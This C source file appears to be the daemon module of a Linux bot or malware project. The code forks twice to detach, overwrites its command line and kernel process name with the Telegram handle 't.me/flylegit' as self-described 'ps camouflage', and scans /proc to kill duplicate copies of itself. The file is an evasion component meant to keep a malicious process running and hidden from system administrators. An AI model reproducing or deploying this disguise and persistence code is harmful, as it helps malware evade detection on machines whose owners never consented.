#define _GNU_SOURCE

#include "headers/daemon.h"
#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

/* ps camouflage: full string across the whole argv area (cmdline),
   plus comm (kernel-truncated to 15). */
static void set_proc_name(int argc, char **argv) {
    static const char name[] = "t.me/flylegit";
    size_t total = 0;
    for (int i = 0; i < argc; i++) {
        if (!argv[i]) break;
        total += strlen(argv[i]) + 1;
    }
    if (total > 0) {
        size_t n = sizeof(name) - 1;
        char *dst = argv[0];
        if (n >= total) n = total - 1;
        memcpy(dst, name, n);
        memset(dst + n, '\0', total - n);
    }
    /* comm (15 chars) follows the same disguise, truncated by kernel */
    prctl(PR_SET_NAME, (unsigned long)"t.me/flylegit", 0, 0, 0);
}

/* single instance via /proc: same binary already running?
   older pid wins (we exit), younger gets SIGKILLed. */
static void single_instance(void) {
    char self[512];
    ssize_t sl = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (sl <= 0) return;
    self[sl] = '\0';
    pid_t me = getpid();
    DIR *d = opendir("/proc");
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (!isdigit((unsigned char)e->d_name[0])) continue;
        pid_t pid = (pid_t)atoi(e->d_name);
        if (pid <= 0 || pid == me) continue;
        char p[64], exe[512];
        snprintf(p, sizeof(p), "/proc/%d/exe", (int)pid);
        ssize_t l = readlink(p, exe, sizeof(exe) - 1);
        if (l <= 0) continue;
        exe[l] = '\0';
        if (strcmp(exe, self) == 0) {
            if (pid < me) {
                closedir(d);
                _exit(0);
            }
            kill(pid, SIGKILL);
        }
    }
    closedir(d);
}

void daemonize(int argc, char **argv) {
    set_proc_name(argc, argv);

    pid_t pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0);
    setsid();
    pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0);

    single_instance();
}
